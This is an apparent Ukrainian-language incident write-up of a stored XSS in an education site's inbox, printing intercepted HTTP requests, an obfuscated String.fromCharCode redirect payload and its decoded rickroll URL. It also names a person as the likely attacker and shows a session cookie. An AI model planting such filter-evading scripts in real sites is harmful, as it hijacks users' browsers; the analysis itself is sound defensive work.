## Нещодавно ми зафіксували атаку на вхідну скриньку edu.edu.vn.ua:

![](Pasted%20image%2020250529001736.png)


Після спроби прочитати вхідні — з’являється сторінка з рікролом на YouTube:

Оригінальний GET-запит:

`GET /messages/inbox HTTP/2`
`Host: edu.edu.vn.ua`
`Cookie: PHPSESSID=7a8fpt33ckkt74bf937l57gd36`
`Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"`
`Sec-Ch-Ua-Mobile: ?0`
`Sec-Ch-Ua-Platform: "Linux"`
`Accept-Language: ru-RU,ru;q=0.9`
`Upgrade-Insecure-Requests: 1`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7`
`Sec-Fetch-Site: same-origin`
`Sec-Fetch-Mode: navigate`
`Sec-Fetch-User: ?1`
`Sec-Fetch-Dest: document`
`Referer: https://edu.edu.vn.ua/course/userlist`
`Accept-Encoding: gzip, deflate, br`
`Priority: u=0, i`

Шкідлива відповідь:

`GET /xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI HTTP/2`
`Host: youtu.be`
`Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"`
`Sec-Ch-Ua-Mobile: ?0`
`...`
`Referer: https://edu.edu.vn.ua/`
`Accept-Encoding: gzip, deflate, br`
`Priority: u=0, i`

Через Burp Suite ми перехопили цей шкідливий GET-запит:

![](Pasted%20image%2020250529002114.png)

Також видно, що сторінка вхідних edu.edu.vn.ua завантажується нормально, поки не намагається завантажити всі отримані повідомлення:

![](Pasted%20image%2020250529002407.png)

Після аналізу HTML було знайдено підозрілий код:

![](Pasted%20image%2020250529002633.png)

`const codes = [ 104,116,116,112,115,58,47,47,121,111,117,116,117,46,98,101,47, 120,118,70,90,106,111,53,80,103,71,48,63,115,105,61,102,71,119, 95,75,74,53,89,75,66,108,75,80,121,68,73 ]; window.location.href = String.fromCharCode(...codes);`

Цей код містився в повідомленні за посиланням: https://edu.edu.vn.ua/messages/view/500113

Після переходу за цим посиланням ми знайшли ймовірного зловмисника:
Захаренков Іван Олексійович

За допомогою ChatGPT:

    Ага, ось він — класичний XSS з обходом фільтрів через String.fromCharCode:

    const codes = [
      104,116,116,112,115,58,47,47,121,111,117,116,117,46,98,101,47,
      120,118,70,90,106,111,53,80,103,71,48,63,115,105,61,102,71,119,
      95,75,74,53,89,75,66,108,75,80,121,68,73
    ];
    window.location.href = String.fromCharCode(...codes);

    Це просто "зашифрований" редирект:
    🧠 Декодовано: https://youtu.be/xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI

Ми декодували payload:

```window.location.href = String.fromCharCode(https://youtu.be/xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI);```

Це звичайний рікрол.
Висновок:

Якимось чином на сайті з’явився шкідливий код, що обходить XSS-фільтри за допомогою ASCII-кодування, і який виконується під час завантаження вмісту /inbox. Після цього код редиректить користувача на рікрол.